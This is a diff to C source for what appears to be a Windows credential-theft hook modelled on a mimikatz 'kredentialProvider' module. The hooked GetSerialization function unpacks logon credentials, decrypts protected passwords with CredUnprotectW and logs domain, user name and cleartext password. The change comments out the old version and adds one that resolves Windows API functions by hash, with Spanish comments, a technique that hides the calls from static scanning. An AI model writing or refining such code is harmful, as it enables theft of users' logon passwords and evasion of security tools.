@@ -67,53 +67,122 @@ NTSTATUS NTAPI kredentialProvider_log(PWSTR szDomain, PWSTR szLogin, PWSTR szPas
 }
 
 GetSerializationType GetSerializationOld;
-HRESULT STDMETHODCALLTYPE GetSerializationNew(IUnknown* This, /* [out] */ PVOID pcpgsr, /* [out] */ CREDENTIAL_PROVIDER_CREDENTIAL_SERIALIZATION* pcpcs, /* [out] */ LPWSTR* ppszOptionalStatusText, /* [out] */ PVOID pcpsiOptionalStatusIcon)
+//HRESULT STDMETHODCALLTYPE GetSerializationNew(IUnknown* This, /* [out] */ PVOID pcpgsr, /* [out] */ CREDENTIAL_PROVIDER_CREDENTIAL_SERIALIZATION* pcpcs, /* [out] */ LPWSTR* ppszOptionalStatusText, /* [out] */ PVOID pcpsiOptionalStatusIcon)
+//{
+//	GetSerializationType ser = NULL;
+//	HRESULT hr;
+//	TCHAR szUser[256], szPassword[256], szDomain[256], szPasswordClearText[256];
+//	DWORD dwUserLen = ARRAYSIZE(szUser), dwPasswordLen = ARRAYSIZE(szPassword), dwDomainLen = ARRAYSIZE(szDomain), dwPasswordClearTextLen = ARRAYSIZE(szPasswordClearText);
+//	CRED_PROTECTION_TYPE ctype;
+//	HMODULE hAdvApi32, hCredUI;
+//	CredUnPackAuthenticationBufferWFct* CredUnPackAuthenticationBufferInst;
+//	CredIsProtectedWFct* CredIsProtectedInst;
+//	CredUnprotectWFct* CredUnprotectWInst;
+//
+//
+//	PDWORD functionAddress = getFunctionAddressByHash((char*)"kernel32", 0x003db390f);
+//	customGetProcAddress GetProcAddress_ = (customGetProcAddress) functionAddress;
+//
+//	PDWORD functionAddress2 = getFunctionAddressByHash((char*)"kernel32", 0x006b80253);
+//	customLoadLibraryW LoadLibraryA = (customLoadLibraryW) functionAddress2;
+//
+//	if (GetSerializationOld == NULL)
+//		return E_NOTIMPL;
+//
+//	hr = GetSerializationOld(This, pcpgsr, pcpcs, ppszOptionalStatusText, pcpsiOptionalStatusIcon);
+//	if (!SUCCEEDED(hr))
+//	{
+//		return hr;
+//	}
+//
+//	//hCredUI = LoadLibrary(L"Credui.dll");
+//	hCredUI = LoadLibraryA(L"Credui.dll");
+//	if(hCredUI)
+//	{
+//		//hAdvApi32 = LoadLibrary(L"advapi32.dll");
+//		hAdvApi32 = LoadLibraryA(L"advapi32.dll");
+//		if(hAdvApi32)
+//		{
+//
+//			//CredUnPackAuthenticationBufferInst = (CredUnPackAuthenticationBufferWFct*)GetProcAddress(hCredUI, "CredUnPackAuthenticationBufferW");
+//			CredUnPackAuthenticationBufferInst = (CredUnPackAuthenticationBufferWFct*)GetProcAddress_(hCredUI, "CredUnPackAuthenticationBufferW");
+//			//CredIsProtectedInst = (CredIsProtectedWFct*)GetProcAddress(hAdvApi32, "CredIsProtectedW");
+//			CredIsProtectedInst = (CredIsProtectedWFct*)GetProcAddress_(hAdvApi32, "CredIsProtectedW");
+//			//CredUnprotectWInst = (CredUnprotectWFct*)GetProcAddress(hAdvApi32, "CredUnprotectW");
+//			CredUnprotectWInst = (CredUnprotectWFct*)GetProcAddress_(hAdvApi32, "CredUnprotectW");
+//
+//			if(CredUnPackAuthenticationBufferInst && CredIsProtectedInst && CredUnprotectWInst)
+//			{
+//				if(CredUnPackAuthenticationBufferInst(0, pcpcs->rgbSerialization, pcpcs->cbSerialization, szUser, &dwUserLen, szDomain, &dwDomainLen, szPassword, &dwPasswordLen))
+//				{
+//					if (CredIsProtectedInst(szPassword, &ctype))
+//					{
+//						if (CredUnprotectWInst(TRUE, szPassword, dwPasswordLen, szPasswordClearText, &dwPasswordClearTextLen))
+//						{
+//							kredentialProvider_log(szDomain, szUser, szPasswordClearText);
+//						}
+//						else hr = GetLastError();
+//					}
+//					else
+//					{
+//						kredentialProvider_log(szDomain, szUser, szPassword);
+//					}
+//				}
+//				else hr = GetLastError();
+//			}
+//			else hr = E_POINTER;
+//
+//			FreeModule(hAdvApi32);
+//		}
+//		else hr = E_HANDLE;
+//
+//		FreeModule(hCredUI);
+//	}
+//	else hr = E_HANDLE;
+//
+//	return hr;
+//}
+
+HRESULT STDMETHODCALLTYPE GetSerializationNew(IUnknown* This, /* [out] */ PVOID pcpgsr, /* [out] */ CREDENTIAL_PROVIDER_CREDENTIAL_SERIALIZATION* pcpcs, /* [out] */ LPWSTR* ppszOptionalStatusText,/* [out] */ PVOID pcpsiOptionalStatusIcon)
 {
 	GetSerializationType ser = NULL;
 	HRESULT hr;
 	TCHAR szUser[256], szPassword[256], szDomain[256], szPasswordClearText[256];
-	DWORD dwUserLen = ARRAYSIZE(szUser), dwPasswordLen = ARRAYSIZE(szPassword), dwDomainLen = ARRAYSIZE(szDomain), dwPasswordClearTextLen = ARRAYSIZE(szPasswordClearText);
+	DWORD dwUserLen = ARRAYSIZE(szUser), dwPasswordLen = ARRAYSIZE(szPassword),
+		dwDomainLen = ARRAYSIZE(szDomain), dwPasswordClearTextLen = ARRAYSIZE(szPasswordClearText);
 	CRED_PROTECTION_TYPE ctype;
 	HMODULE hAdvApi32, hCredUI;
 	CredUnPackAuthenticationBufferWFct* CredUnPackAuthenticationBufferInst;
 	CredIsProtectedWFct* CredIsProtectedInst;
 	CredUnprotectWFct* CredUnprotectWInst;
 
-
-	PDWORD functionAddress = getFunctionAddressByHash((char*)"kernel32", 0x003db390f);
-	customGetProcAddress GetProcAddress_ = (customGetProcAddress) functionAddress;
-
-	PDWORD functionAddress2 = getFunctionAddressByHash((char*)"kernel32", 0x006b80253);
-	customLoadLibraryW LoadLibraryA = (customLoadLibraryW) functionAddress2;
-
+	// Verifica que tengamos la función original
 	if (GetSerializationOld == NULL)
 		return E_NOTIMPL;
 
+	// Ejecuta la original primero
 	hr = GetSerializationOld(This, pcpgsr, pcpcs, ppszOptionalStatusText, pcpsiOptionalStatusIcon);
 	if (!SUCCEEDED(hr))
-	{
 		return hr;
-	}
 
-	//hCredUI = LoadLibrary(L"Credui.dll");
-	hCredUI = LoadLibraryA(L"Credui.dll");
-	if(hCredUI)
+	
+	if ((hCredUI = LoadLibraryW(L"Credui.dll")))
 	{
-		//hAdvApi32 = LoadLibrary(L"advapi32.dll");
-		hAdvApi32 = LoadLibraryA(L"advapi32.dll");
-		if(hAdvApi32)
+		if ((hAdvApi32 = LoadLibraryW(L"advapi32.dll")))
 		{
+			// Resuelve las funciones por hash
+			DWORD hashCredUnpack = getHashFromString("CredUnPackAuthenticationBufferW");
+			DWORD hashCredIsProt = getHashFromString("CredIsProtectedW");
+			DWORD hashCredUnprot = getHashFromString("CredUnprotectW");
 
-			//CredUnPackAuthenticationBufferInst = (CredUnPackAuthenticationBufferWFct*)GetProcAddress(hCredUI, "CredUnPackAuthenticationBufferW");
-			CredUnPackAuthenticationBufferInst = (CredUnPackAuthenticationBufferWFct*)GetProcAddress_(hCredUI, "CredUnPackAuthenticationBufferW");
-			//CredIsProtectedInst = (CredIsProtectedWFct*)GetProcAddress(hAdvApi32, "CredIsProtectedW");
-			CredIsProtectedInst = (CredIsProtectedWFct*)GetProcAddress_(hAdvApi32, "CredIsProtectedW");
-			//CredUnprotectWInst = (CredUnprotectWFct*)GetProcAddress(hAdvApi32, "CredUnprotectW");
-			CredUnprotectWInst = (CredUnprotectWFct*)GetProcAddress_(hAdvApi32, "CredUnprotectW");
+			CredUnPackAuthenticationBufferInst = (CredUnPackAuthenticationBufferWFct*)getFunctionByHash(hCredUI, hashCredUnpack);
+			CredIsProtectedInst = (CredIsProtectedWFct*)getFunctionByHash(hAdvApi32, hashCredIsProt);
+			CredUnprotectWInst = (CredUnprotectWFct*)getFunctionByHash(hAdvApi32, hashCredUnprot);
 
-			if(CredUnPackAuthenticationBufferInst && CredIsProtectedInst && CredUnprotectWInst)
+			if (CredUnPackAuthenticationBufferInst && CredIsProtectedInst && CredUnprotectWInst)
 			{
-				if(CredUnPackAuthenticationBufferInst(0, pcpcs->rgbSerialization, pcpcs->cbSerialization, szUser, &dwUserLen, szDomain, &dwDomainLen, szPassword, &dwPasswordLen))
+				if (CredUnPackAuthenticationBufferInst(0, pcpcs->rgbSerialization, pcpcs->cbSerialization,
+					szUser, &dwUserLen, szDomain, &dwDomainLen, szPassword, &dwPasswordLen))
 				{
 					if (CredIsProtectedInst(szPassword, &ctype))
 					{
@@ -132,16 +201,17 @@ HRESULT STDMETHODCALLTYPE GetSerializationNew(IUnknown* This, /* [out] */ PVOID 
 			}
 			else hr = E_POINTER;
 
-			FreeModule(hAdvApi32);
+			FreeLibrary(hAdvApi32);
 		}
 		else hr = E_HANDLE;
 
-		FreeModule(hCredUI);
+		FreeLibrary(hCredUI);
 	}
 	else hr = E_HANDLE;
 
 	return hr;
 }
+
 
 GetCredentialAtType GetCredentialAtOld;
 HRESULT(STDMETHODCALLTYPE GetCredentialAt)(IUnknown* This, DWORD dwIndex, ICredentialProviderCredential** ppcpc)
